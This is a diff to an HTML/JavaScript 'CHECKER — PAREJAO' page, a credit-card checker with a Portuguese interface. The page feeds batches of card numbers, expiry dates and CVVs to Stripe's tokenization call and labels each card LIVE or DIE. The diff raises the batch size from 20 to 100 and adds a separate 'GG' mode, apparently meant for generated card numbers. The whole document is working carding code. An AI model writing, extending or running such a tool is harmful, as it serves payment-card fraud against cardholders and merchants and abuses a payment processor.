@@ -77,25 +77,26 @@
   <h1>CHECKER — PAREJAO</h1>
   
   <div class="section">
-    <label>Cartões (1 por linha — até 20)</label>
-    <textarea id="cardsInput" placeholder="Formato: numero|mes|ano|cvv
+    <label>Checker CC (até 100)</label>
+    <textarea id="cardsInput" placeholder="numero|mes|ano|cvv
 Exemplo:
 4242424242424242|12|2025|123"></textarea>
   </div>
   
   <div class="section">
-    <label>Checker GG (CC test — até 20)</label>
-    <textarea id="ggTest" placeholder="Formato: numero|mes|ano|cvv
+    <label>Checker GG (até 100)</label>
+    <textarea id="ggTest" placeholder="numero|mes|ano|cvv
 Exemplo:
 4242424242424242|12|2025|123"></textarea>
   </div>
   
   <div class="btn-group">
-    <button class="btn btn-primary" id="btnStart" onclick="startCheck()">Iniciar</button>
+    <button class="btn btn-primary" id="btnStart" onclick="startCheck('cc')">Iniciar CC</button>
+    <button class="btn btn-primary" id="btnStartGG" onclick="startCheck('gg')">Iniciar GG</button>
     <button class="btn btn-stop" id="btnStop" onclick="stopCheck()" disabled>Parar</button>
   </div>
   
-  <div class="status" id="status">Pronto — insira até 20 cards</div>
+  <div class="status" id="status">Pronto — até 100 cards</div>
   
   <div class="section">
     <label>Resultados</label>
@@ -116,8 +117,8 @@ let processedCount = 0;
 function parseCards(text) {
   return text.split('\n')
     .map(l => l.trim())
-    .filter(l => l.length > 0)
-    .slice(0, 20);
+    .filter(l => l)
+    .slice(0, 100);
 }
 
 function addResult(text, isLive = false) {
@@ -133,7 +134,7 @@ function addResult(text, isLive = false) {
 async function checkCard(cardLine) {
   try {
     const parts = cardLine.split('|');
-    if (parts.length !== 4) return { ok: false, msg: 'Formato inválido' };
+    if (parts.length !== 4) return { ok: false, msg: 'DIE' };
     const [number, expMonth, expYear, cvc] = parts.map(p => p.trim());
     const cardData = {
       number,
@@ -143,7 +144,7 @@ async function checkCard(cardLine) {
     };
     const { token, error } = await stripe.createToken('card', cardData);
     if (error) return { ok: false, msg: 'DIE' };
-    return { ok: true, msg: 'LIVE' };
+    return { ok: true, msg: 'LIVE ====> @PAREJAO' };
   } catch (err) {
     return { ok: false, msg: 'DIE' };
   }
@@ -153,6 +154,7 @@ async function processList(cards) {
   isRunning = true;
   processedCount = 0;
   document.getElementById('btnStart').disabled = true;
+  document.getElementById('btnStartGG').disabled = true;
   document.getElementById('btnStop').disabled = false;
   document.getElementById('status').textContent = 'Processando... 0/' + cards.length;
 
@@ -163,7 +165,7 @@ async function processList(cards) {
     processedCount = i + 1;
     document.getElementById('status').textContent = 'Processando... ' + processedCount + '/' + cards.length;
     if (res.ok) {
-      addResult('LIVE ====> @PAREJAO', true);
+      addResult(res.msg, true);
     } else {
       addResult(line + ' — ' + res.msg);
     }
@@ -172,13 +174,16 @@ async function processList(cards) {
 
   isRunning = false;
   document.getElementById('btnStart').disabled = false;
+  document.getElementById('btnStartGG').disabled = false;
   document.getElementById('btnStop').disabled = true;
   document.getElementById('status').textContent = 'Concluído — ' + processedCount + '/' + cards.length + ' processados';
 }
 
-function startCheck() {
+function startCheck(mode) {
   if (isRunning) return;
-  const raw = document.getElementById('cardsInput').value;
+  const raw = mode === 'gg'
+    ? document.getElementById('ggTest').value
+    : document.getElementById('cardsInput').value;
   const cards = parseCards(raw);
   if (cards.length === 0) {
     document.getElementById('status').textContent = 'Nenhum cartão válido';
@@ -193,20 +198,6 @@ function stopCheck() {
   document.getElementById('btnStop').disabled = true;
   document.getElementById('status').textContent = 'Parado no último resultado (' + processedCount + ')';
 }
-
-document.getElementById('ggTest').addEventListener('keydown', function(e) {
-  if (e.key === 'Enter') {
-    e.preventDefault();
-    if (!isRunning) {
-      const raw = document.getElementById('cardsInput').value;
-      const cards = parseCards(raw);
-      if (cards.length > 0) {
-        document.getElementById('results').innerHTML = '';
-        processList(cards);
-      }
-    }
-  }
-});
 </script>
 </body>
 </html>
